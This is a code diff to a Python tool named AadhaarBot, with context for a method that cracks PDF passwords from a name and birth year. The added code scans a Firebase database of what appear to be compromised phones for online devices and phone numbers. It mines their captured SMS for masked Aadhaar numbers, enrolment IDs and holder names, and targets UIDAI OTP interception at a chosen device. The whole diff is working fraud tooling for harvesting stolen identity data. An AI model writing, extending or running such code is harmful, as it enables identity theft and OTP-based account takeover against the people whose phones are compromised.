@@ -633,7 +633,7 @@ class AadhaarBot:
     def crack_pdf_with_name(self, pdf_path, name, birth_year=None, progress_callback=None):
         return self.cracker.crack_pdf(pdf_path, name, birth_year, progress_callback)
 
-    def normalize_firebase_url(self, url: str):
+    def normalize_firebase_url(self, url: str, device_id: str = None):
         """Normalizes Firebase RTDB URL and returns base URL and candidate endpoints."""
         url = url.strip()
         if not url.startswith('http://') and not url.startswith('https://'):
@@ -641,11 +641,17 @@ class AadhaarBot:
         parsed = urlparse(url)
         base = f"{parsed.scheme}://{parsed.netloc}"
         endpoints = []
+        if device_id:
+            dev_clean = str(device_id).strip()
+            endpoints.append(f"{base}/messages/{dev_clean}.json")
+            endpoints.append(f"{base}/clients/{dev_clean}/messages.json")
+            endpoints.append(f"{base}/clients/{dev_clean}.json")
         if parsed.path and parsed.path not in ('', '/'):
             p = parsed.path
             if not p.endswith('.json'):
                 p += '.json'
-            endpoints.append(f"{base}{p}")
+            if f"{base}{p}" not in endpoints:
+                endpoints.append(f"{base}{p}")
         for path in ('/messages.json', '/user_sms.json', '/profex_incoming.json', '/incoming.json', '/.json'):
             cand = f"{base}{path}"
             if cand not in endpoints:
@@ -674,13 +680,122 @@ class AadhaarBot:
         except Exception as e:
             return False, str(e)
 
-    def fetch_otp_from_firebase(self, firebase_url: str, min_timestamp: float = None, timeout: int = 75, poll_interval: int = 3, target_mobile: str = None, exclude_otps: list = None):
+    def scan_firebase_devices(self, firebase_url: str, max_check: int = 15):
+        """
+        Scans a Firebase Realtime Database for active/online devices,
+        extracts their mobile numbers, model, battery, and checks SMS for Aadhaar / EID presence.
+        Returns (ok: bool, result_dict_or_error_msg).
+        """
+        try:
+            base, _ = self.normalize_firebase_url(firebase_url)
+            session = requests.Session()
+            session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+
+            clients_resp = session.get(f"{base}/clients.json", timeout=10)
+            if clients_resp.status_code != 200:
+                return False, f"HTTP {clients_resp.status_code} accessing clients.json"
+
+            clients = clients_resp.json() or {}
+            if not isinstance(clients, dict):
+                return False, "No valid clients node found in database"
+
+            candidates = []
+            for dev_id, c in clients.items():
+                if not isinstance(c, dict):
+                    continue
+                is_online = c.get('isOnline') or c.get('online') or (c.get('status') in ['online', 'active', True, 1])
+                mob = c.get('mobNo') or c.get('phone') or c.get('mobile') or ''
+                mob_clean = re.sub(r'\D', '', str(mob))
+                if len(mob_clean) == 12 and mob_clean.startswith('91'):
+                    mob_clean = mob_clean[2:]
+                elif len(mob_clean) > 10:
+                    mob_clean = mob_clean[-10:]
+
+                model = c.get('modelName') or c.get('model') or 'Android Device'
+                battery = str(c.get('battery') or '')
+                joined = str(c.get('joined') or '')
+
+                has_valid_mobile = len(mob_clean) == 10 and mob_clean[0] in '6789'
+                if is_online or has_valid_mobile:
+                    candidates.append({
+                        'dev_id': dev_id,
+                        'is_online': bool(is_online),
+                        'mobile': mob_clean if has_valid_mobile else None,
+                        'model': model,
+                        'battery': battery,
+                        'joined': joined,
+                        'has_aadhaar_sms': False,
+                        'aadhaar_masked': None,
+                        'eid': None,
+                        'holder_name': None
+                    })
+
+            # Sort: online first, then with valid mobile
+            candidates.sort(key=lambda x: (1 if x['is_online'] else 0, 1 if x['mobile'] else 0), reverse=True)
+
+            top_candidates = candidates[:max_check]
+
+            def check_sms(dev):
+                try:
+                    r = session.get(f"{base}/messages/{dev['dev_id']}.json", timeout=6)
+                    if r.status_code == 200:
+                        msgs = r.json() or {}
+                        if isinstance(msgs, dict):
+                            for mid, m in msgs.items():
+                                if not isinstance(m, dict):
+                                    continue
+                                t = str(m.get('message', ''))
+                                s = str(m.get('sender', '')).lower()
+                                t_lower = t.lower()
+
+                                if 'aadhaar' in t_lower or 'adhaar' in t_lower or 'uidai' in t_lower or 'adhaar' in s:
+                                    dev['has_aadhaar_sms'] = True
+                                    if not dev['aadhaar_masked']:
+                                        m_mask = re.search(r'\b(?:XX|xx|\*{4})(\d{4})\b', t)
+                                        if m_mask:
+                                            dev['aadhaar_masked'] = f"XXXX-XXXX-{m_mask.group(1)}"
+                                    if not dev['eid']:
+                                        m_eid = re.search(r'\b(\d{14,28})\b', t)
+                                        if m_eid and len(m_eid.group(1)) in (14, 28):
+                                            dev['eid'] = m_eid.group(1)
+
+                                if not dev['holder_name']:
+                                    m_name = re.search(r'(?:dear|hi|hello)\s+([A-Za-z]+(?:\s+[A-Za-z]+){1,2})', t, re.IGNORECASE)
+                                    if m_name:
+                                        n = m_name.group(1).strip()
+                                        if n.lower() not in ('customer', 'user', 'cardholder', 'sir', 'madam', 'member', 'applicant', 'resident'):
+                                            dev['holder_name'] = n
+                except Exception:
+                    pass
+                return dev
+
+            with ThreadPoolExecutor(max_workers=8) as ex:
+                results = list(ex.map(check_sms, top_candidates))
+
+            # Put verified devices with Aadhaar/Mobile to the top
+            results.sort(key=lambda x: (1 if x['is_online'] else 0, 1 if x['has_aadhaar_sms'] else 0, 1 if x['mobile'] else 0), reverse=True)
+
+            total_online = sum(1 for c in candidates if c['is_online'])
+            aadhaar_count = sum(1 for c in results if c['has_aadhaar_sms'])
+
+            return True, {
+                "base_url": base,
+                "total_clients": len(clients),
+                "total_online": total_online,
+                "aadhaar_count": aadhaar_count,
+                "devices": results
+            }
+        except Exception as e:
+            logger.error(f"Error scanning firebase devices: {e}", exc_info=True)
+            return False, str(e)
+
+    def fetch_otp_from_firebase(self, firebase_url: str, min_timestamp: float = None, timeout: int = 75, poll_interval: int = 3, target_mobile: str = None, exclude_otps: list = None, device_id: str = None):
         """
         Polls a Firebase Realtime Database for incoming UIDAI / Aadhaar OTP SMS.
         Matches 6-digit OTPs with UIDAI/Aadhaar keywords and optionally prioritizes the target mobile's last 4 digits.
         Returns (found: bool, otp_code: Optional[str], full_text: Optional[str]).
         """
-        base, endpoints = self.normalize_firebase_url(firebase_url)
+        base, endpoints = self.normalize_firebase_url(firebase_url, device_id=device_id)
         exclude_set = set(str(x).strip() for x in (exclude_otps or []))
         last4 = str(target_mobile).strip()[-4:] if target_mobile and len(str(target_mobile).strip()) >= 4 else None
         min_ts = min_timestamp if min_timestamp is not None else (time.time() - 120)
